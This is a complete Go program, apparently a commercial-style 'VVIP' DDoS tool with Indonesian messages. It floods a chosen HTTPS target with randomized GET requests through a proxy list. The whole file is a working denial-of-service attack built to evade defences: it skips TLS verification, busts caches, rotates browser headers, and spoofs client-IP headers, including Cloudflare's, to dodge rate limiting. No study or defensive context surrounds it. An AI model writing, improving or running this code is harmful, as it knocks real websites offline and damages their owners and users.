package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	targetURL   *url.URL
	durationSec int
	ratePerSec  int
	threads     int
	proxyList   []string
	stopFlag    bool
	wg          sync.WaitGroup
)

var acceptHeaders = []string{"*/*", "image/*", "text/html", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"}
var encodingHeaders = []string{"gzip", "gzip, deflate, br", "gzip, deflate"}
var langHeaders = []string{"id-ID,id;q=0.9,en;q=0.8", "en-US,en;q=0.9"}
var cacheHeaders = []string{"no-cache", "max-age=0", "must-revalidate"}
var referers = []string{"https://google.com", "https://check-host.net/", "https://www.facebook.com/"}
var uaList = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/133.0.0.0 Safari/537.36",
}
var secFetchModes = []string{"navigate", "no-cors", "cors"}
var secFetchSites = []string{"same-origin", "same-site", "cross-site"}
var secFetchDests = []string{"document", "worker", "subresource"}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randInt(min, max int) int {
	return rand.Intn(max-min+1) + min
}

func randomElement(list []string) string {
	return list[rand.Intn(len(list))]
}

func spoofIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func readProxyFile(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		fmt.Println("[!] Gagal baca proxy:", err)
		os.Exit(1)
	}
	defer file.Close()
	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	return proxies
}

func worker() {
	defer wg.Done()
	for !stopFlag {
		proxyAddr := randomElement(proxyList)
		parts := strings.Split(proxyAddr, ":")
		if len(parts) < 2 {
			continue
		}
		proxyHost := parts[0]
		proxyPort, _ := strconv.Atoi(parts[1])

		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", proxyHost, proxyPort), 10*time.Second)
		if err != nil {
			continue
		}

		connectReq := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nConnection: Keep-Alive\r\n\r\n", targetURL.Host, targetURL.Host)
		_, err = conn.Write([]byte(connectReq))
		if err != nil {
			conn.Close()
			continue
		}

		respBuf := make([]byte, 1024)
		n, _ := conn.Read(respBuf)
		if n == 0 || !strings.Contains(string(respBuf[:n]), "200") {
			conn.Close()
			continue
		}

		tlsConfig := &tls.Config{
			ServerName:         targetURL.Host,
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2"},
			MinVersion:         tls.VersionTLS12,
		}
		tlsConn := tls.Client(conn, tlsConfig)
		err = tlsConn.Handshake()
		if err != nil {
			tlsConn.Close()
			conn.Close()
			continue
		}

		tr := &http.Transport{
			Dial: func(network, addr string) (net.Conn, error) {
				return tlsConn, nil
			},
			ForceAttemptHTTP2: true,
			TLSClientConfig:   tlsConfig,
		}
		client := &http.Client{Transport: tr}

		rateTicker := time.NewTicker(time.Second)
		for range rateTicker.C {
			if stopFlag {
				rateTicker.Stop()
				break
			}
			for i := 0; i < ratePerSec; i++ {
				go func() {
					path := targetURL.Path + "?" + randStr(6) + "=" + randStr(randInt(10, 20))
					req, _ := http.NewRequest("GET", targetURL.Scheme+"://"+targetURL.Host+path, nil)
					req.Header.Set(":authority", targetURL.Host)
					req.Header.Set("accept", randomElement(acceptHeaders))
					req.Header.Set("accept-encoding", randomElement(encodingHeaders))
					req.Header.Set("accept-language", randomElement(langHeaders))
					req.Header.Set("cache-control", randomElement(cacheHeaders))
					req.Header.Set("referer", randomElement(referers))
					req.Header.Set("user-agent", randomElement(uaList))
					req.Header.Set("sec-fetch-mode", randomElement(secFetchModes))
					req.Header.Set("sec-fetch-site", randomElement(secFetchSites))
					req.Header.Set("sec-fetch-dest", randomElement(secFetchDests))
					req.Header.Set("x-forwarded-for", spoofIP())
					req.Header.Set("x-real-ip", spoofIP())
					req.Header.Set("cf-connecting-ip", spoofIP())

					resp, err := client.Do(req)
					if err == nil && resp != nil {
						resp.Body.Close()
					}
				}()
			}
		}
	}
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: go run main.go <target> <time> <rate> <threads> <proxy.txt>")
		fmt.Println("Example: go run main.go https://target.com 60 10 50 proxies.txt")
		os.Exit(1)
	}

	targetStr := os.Args[1]
	var err error
	targetURL, err = url.Parse(targetStr)
	if err != nil || targetURL.Scheme != "https" {
		fmt.Println("[!] Target harus https")
		os.Exit(1)
	}

	durationSec, _ = strconv.Atoi(os.Args[2])
	ratePerSec, _ = strconv.Atoi(os.Args[3])
	threads, _ = strconv.Atoi(os.Args[4])
	proxyFile := os.Args[5]

	proxyList = readProxyFile(proxyFile)
	if len(proxyList) == 0 {
		fmt.Println("[!] Proxy kosong")
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())

	fmt.Println("\033[36m--------------------------------------------\033[0m")
	fmt.Printf("\033[33mTarget: \033[37m%s\033[0m\n", targetStr)
	fmt.Printf("\033[33mTime: \033[37m%ds\033[0m\n", durationSec)
	fmt.Printf("\033[33mRate: \033[37m%d/s\033[0m\n", ratePerSec)
	fmt.Printf("\033[33mThreads: \033[37m%d\033[0m\n", threads)
	fmt.Printf("\033[33mProxy: \033[37m%s (\033[32m%d\033[37m)\033[0m\n", proxyFile, len(proxyList))
	fmt.Println("\033[36m--------------------------------------------\033[0m")
	fmt.Println("\033[35mZANGXX VVIP GOLANG NATIVE | NO EXTERNAL\033[0m")
	fmt.Println("\033[36m--------------------------------------------\033[0m")

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker()
	}

	time.Sleep(time.Duration(durationSec) * time.Second)
	stopFlag = true
	wg.Wait()
	fmt.Println("\n[+] Attack finished.")
}